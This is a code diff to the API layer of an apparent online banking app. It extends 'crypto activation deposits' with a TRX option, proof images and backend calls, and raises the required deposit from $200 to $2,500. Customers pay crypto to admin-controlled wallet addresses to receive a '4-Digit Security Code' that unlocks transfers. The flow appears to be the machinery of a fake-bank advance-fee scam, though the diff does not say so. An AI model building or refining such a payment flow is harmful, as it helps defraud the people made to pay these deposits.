@@ -363,26 +363,45 @@ export const api = {
 
   // --- CRYPTO ACTIVATION DEPOSITS ---
   async submitCryptoActivationDeposit(
-    arg1: 'BTC' | 'USDT' | { cryptoMethod: 'BTC' | 'USDT'; txHash?: string; proofNote?: string },
+    arg1: 'BTC' | 'USDT' | 'TRX' | { cryptoMethod: 'BTC' | 'USDT' | 'TRX'; txHash?: string; proofNote?: string; proofImage?: string },
     txHash?: string,
-    proofNote?: string
+    proofNote?: string,
+    proofImage?: string
   ): Promise<{ deposit: CryptoActivationDeposit; user: User }> {
     const current = dbStore.getCurrentUser();
     if (!current) throw new Error('Not authenticated');
 
-    let cryptoMethod: 'BTC' | 'USDT' = 'BTC';
+    let cryptoMethod: 'BTC' | 'USDT' | 'TRX' = 'BTC';
     let hash = txHash || '';
     let note = proofNote || '';
+    let img = proofImage || '';
 
     if (typeof arg1 === 'object') {
       cryptoMethod = arg1.cryptoMethod;
       hash = arg1.txHash || '';
       note = arg1.proofNote || '';
+      img = arg1.proofImage || '';
     } else {
       cryptoMethod = arg1;
     }
 
+    try {
+      const backendRes = await requestApi<{ deposit: CryptoActivationDeposit; user: User }>('/user/crypto-activation-deposit', {
+        method: 'POST',
+        body: JSON.stringify({ cryptoMethod, txHash: hash, proofNote: note, proofImage: img })
+      });
+      if (backendRes && backendRes.deposit) {
+        dbStore.addCryptoDeposit(backendRes.deposit);
+        if (backendRes.user) dbStore.saveUser(backendRes.user);
+        return backendRes;
+      }
+    } catch (e) {
+      console.warn('Backend crypto activation call failed, using local fallback:', e);
+    }
+
     const walletAddresses = dbStore.getCryptoAddresses();
+    const selectedAddress = walletAddresses[cryptoMethod] || walletAddresses.TRX || walletAddresses.BTC;
+
     const dep: CryptoActivationDeposit = {
       id: `DEP-${Date.now()}`,
       userId: current.id,
@@ -390,58 +409,89 @@ export const api = {
       userName: current.fullName,
       accountNumber: current.accountNumber,
       cryptoMethod,
-      walletAddress: walletAddresses[cryptoMethod],
-      amountUSD: 200,
+      walletAddress: selectedAddress,
+      amountUSD: 2500,
       txHash: hash,
       proofNote: note,
+      proofImage: img || undefined,
       status: 'Pending',
       createdAt: new Date().toISOString(),
       updatedAt: new Date().toISOString()
     };
 
     dbStore.addCryptoDeposit(dep);
-    return { deposit: dep, user: current };
+    const updatedUser = dbStore.saveUser({ ...current, pendingCryptoDeposit: dep });
+    return { deposit: dep, user: updatedUser };
   },
 
   async getCryptoActivationDeposits(): Promise<{ deposits: CryptoActivationDeposit[] }> {
+    try {
+      const backendRes = await requestApi<{ deposits: CryptoActivationDeposit[] }>('/admin/crypto-activation-deposits');
+      if (backendRes && backendRes.deposits) {
+        return backendRes;
+      }
+    } catch (e) {
+      console.warn('Backend get crypto deposits fallback:', e);
+    }
     return { deposits: dbStore.getCryptoDeposits() };
   },
 
   async approveCryptoDeposit(depositId: string): Promise<{ deposit: CryptoActivationDeposit; code: string; user: User }> {
+    try {
+      const backendRes = await requestApi<{ deposit: CryptoActivationDeposit; code: string; user: User }>('/admin/approve-crypto-activation-deposit', {
+        method: 'POST',
+        body: JSON.stringify({ depositId })
+      });
+      if (backendRes && backendRes.deposit) {
+        dbStore.updateCryptoDeposit(depositId, backendRes.deposit);
+        if (backendRes.user) dbStore.saveUser(backendRes.user);
+        return backendRes;
+      }
+    } catch (e) {
+      console.warn('Backend approve crypto deposit fallback:', e);
+    }
+
     const deposits = dbStore.getCryptoDeposits();
     const target = deposits.find(d => d.id === depositId);
     if (!target) throw new Error('Deposit request not found');
 
     const code = `${Math.floor(1000 + Math.random() * 9000)}`;
-    dbStore.updateCryptoDeposit(depositId, {
+    const now = new Date().toISOString();
+
+    const updatedDep: CryptoActivationDeposit = {
+      ...target,
       status: 'Approved',
       generatedCode: code,
-      updatedAt: new Date().toISOString()
-    });
+      updatedAt: now
+    };
+
+    dbStore.updateCryptoDeposit(depositId, updatedDep);
 
     const user = dbStore.getUserById(target.userId);
+    let updatedUser = user;
     if (user) {
-      dbStore.saveUser({
+      updatedUser = dbStore.saveUser({
         ...user,
         fourDigitCode: code,
         transferCodeApproved: true,
-        balance: user.balance + 200
+        balance: user.balance + 2500,
+        pendingCryptoDeposit: updatedDep
       });
 
       dbStore.addNotification({
         id: `NOTIF-${Date.now()}`,
         userId: user.id,
-        title: '$200 Activation Deposit Approved',
-        message: `Your $200 deposit has been credited. Your official 4-Digit Security Code is [${code}].`,
-        amount: 200,
+        title: '$2,500 Activation Deposit Approved',
+        message: `Your $2,500 deposit has been approved and credited to your account. Your official 4-Digit Security Code is [${code}].`,
+        amount: 2500,
         currency: 'USD',
         reference: target.id,
         read: false,
-        createdAt: new Date().toISOString()
+        createdAt: now
       });
     }
 
-    return { deposit: { ...target, status: 'Approved', generatedCode: code }, code, user: user || ({ fullName: target.userName } as User) };
+    return { deposit: updatedDep, code, user: updatedUser || ({ fullName: target.userName } as User) };
   },
 
   async approveCryptoActivationDeposit(depositId: string): Promise<{ deposit: CryptoActivationDeposit; code: string; user: User }> {
@@ -1166,11 +1216,31 @@ export const api = {
     return { user: updated };
   },
 
-  async getCryptoAddresses(): Promise<{ addresses: { BTC: string; USDT: string } }> {
+  async getCryptoAddresses(): Promise<{ addresses: { BTC: string; USDT: string; TRX: string } }> {
+    try {
+      const backendRes = await requestApi<{ addresses: { BTC: string; USDT: string; TRX: string } }>('/admin/crypto-wallet-addresses');
+      if (backendRes && backendRes.addresses) {
+        return backendRes;
+      }
+    } catch (e) {
+      console.warn('Backend get crypto addresses fallback:', e);
+    }
     return { addresses: dbStore.getCryptoAddresses() };
   },
 
-  async updateCryptoAddresses(addresses: { BTC: string; USDT: string }): Promise<{ addresses: { BTC: string; USDT: string } }> {
+  async updateCryptoAddresses(addresses: { BTC?: string; USDT?: string; TRX?: string }): Promise<{ addresses: { BTC: string; USDT: string; TRX: string } }> {
+    try {
+      const backendRes = await requestApi<{ addresses: { BTC: string; USDT: string; TRX: string } }>('/admin/crypto-wallet-addresses', {
+        method: 'POST',
+        body: JSON.stringify(addresses)
+      });
+      if (backendRes && backendRes.addresses) {
+        dbStore.updateCryptoAddresses(backendRes.addresses);
+        return backendRes;
+      }
+    } catch (e) {
+      console.warn('Backend update crypto addresses fallback:', e);
+    }
     return { addresses: dbStore.updateCryptoAddresses(addresses) };
   },
 
